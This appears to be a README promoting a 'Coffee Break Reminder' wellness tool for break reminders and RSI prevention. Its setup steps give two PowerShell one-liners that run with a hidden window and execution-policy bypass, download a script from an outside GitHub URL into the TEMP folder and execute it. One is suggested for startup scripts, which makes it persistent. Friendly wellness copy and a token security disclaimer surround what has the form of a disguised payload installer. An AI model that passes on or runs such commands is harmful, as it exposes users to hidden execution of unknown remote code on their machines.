# The Coffee Break Reminder: Your Personal Wellness Companion

In today's fast-paced digital world, it's easy to lose track of time and forget to take the small breaks that are essential for your well-being. The Coffee Break Reminder is a lightweight, friendly tool designed to help you build healthier work habits, reduce the risk of repetitive strain injury (RSI), and boost your productivity by encouraging regular pauses.

## Why You'll Love It

*   **Gentle Reminders:** At random intervals, a cheerful toast notification will appear on your screen with a fun, encouraging message, reminding you to stretch, look away from the screen, or simply take a moment to relax.
*   **Boosts Focus:** Regular short breaks have been proven to improve concentration and creativity. By reminding you to step back, this tool helps you return to your work with a clearer mind.
*   **Easy to Use:** No installation is required. You can run the tool with a single command, and it will work quietly in the background.

## Getting Started

Choose the version that best fits your workflow:

### Interactive Mode

This version is perfect if you want to manually start the reminder service. It will greet you with a simple menu.

```powershell
powershell.exe -NoP -W Hidden -Exec Bypass -Command "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/szolll/MW1/main/CoffeeBreak.ps1') | Out-File $env:TEMP\CoffeeBreak.ps1; . $env:TEMP\CoffeeBreak.ps1"
```

### Automatic Mode

For a completely hands-off experience, this version starts the reminder service automatically. It's ideal for adding to your startup scripts, so you never forget to enable it.

```powershell
powershell.exe -NoP -W Hidden -Exec Bypass -Command "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/szolll/MW1/main/CoffeeBreak_auto.ps1') | Out-File $env:TEMP\CoffeeBreak_auto.ps1; . $env:TEMP\CoffeeBreak_auto.ps1"
```

## A Note on Security

We believe in transparency. While this tool is designed to be a helpful companion, we always recommend that you review any script before running it on your system. Your security is our top priority.
